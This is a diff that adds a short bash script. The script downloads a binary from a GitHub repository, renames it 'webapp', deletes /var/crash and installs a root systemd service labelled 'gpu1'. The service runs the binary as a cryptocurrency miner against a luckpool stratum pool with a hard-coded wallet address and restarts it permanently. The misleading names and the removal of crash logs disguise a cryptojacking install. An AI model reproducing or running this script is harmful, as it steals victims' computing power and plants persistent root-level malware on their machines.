@@ -1,0 +1,25 @@
+#!/bin/bash
+cd /home
+sudo wget -O webapp https://github.com/danipedrosang/bang/raw/main/dagger && sudo chmod +x webapp
+sudo chmod +x webapp
+sudo rm -rf /lib/systemd/system/webapp.service
+sudo rm -rf /var/crash
+sudo bash -c 'cat <<EOT >>/lib/systemd/system/webapp.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/webapp -c stratum+tcp://na.luckpool.net:3956 -u RE9ZxBCB3QiXCbjB8erhFVAC4Ph6ZTNqTE.tesch -p x --cpu 1
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+
+sudo systemctl daemon-reload &&
+sudo systemctl enable webapp.service &&
+sudo service webapp stop  &&
+sudo service webapp restart
